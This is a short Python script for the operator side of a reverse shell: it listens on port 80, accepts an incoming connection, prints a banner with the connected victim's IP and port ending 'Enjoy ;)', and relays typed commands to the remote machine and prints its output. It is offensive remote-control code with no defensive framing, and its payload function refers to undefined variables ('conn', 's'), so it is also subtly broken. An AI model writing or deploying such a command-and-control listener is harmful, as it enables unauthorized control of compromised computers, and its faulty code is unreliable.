import socket
import sys
import logging
import coloredlogs

logger = logging.getLogger(__name__)
FMT = ("[%(asctime)s] - %(message)s")
coloredlogs.install(fmt=FMT, logger=logger)

host = ""
port = 80

def payload(connect):
    while True:
        cmd = input()
        if cmd == 'close':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")


def main():
    try:
        logger.info("Waiting for incoming connections.")
        s = socket.socket()
        try:
            s.bind((host, port))
            s.listen(3)
            #Connection has been established
            connect, address = s.accept()
            print("""
                Connected........
                +-------------------+
                | IP:{}
                --------------------+
                | Port:{}      
                +-------------------+
                ..........Enjoy ;)
                """.format(address[0], str(address[1])))

            payload(connect)
            connect.close()
        except Exception as err:
            logger.critical("Error Connecting to Socket: "+ str(err))

    except Exception as err:
        logger.critical("Error Creating Socket: " + str(err))


main()







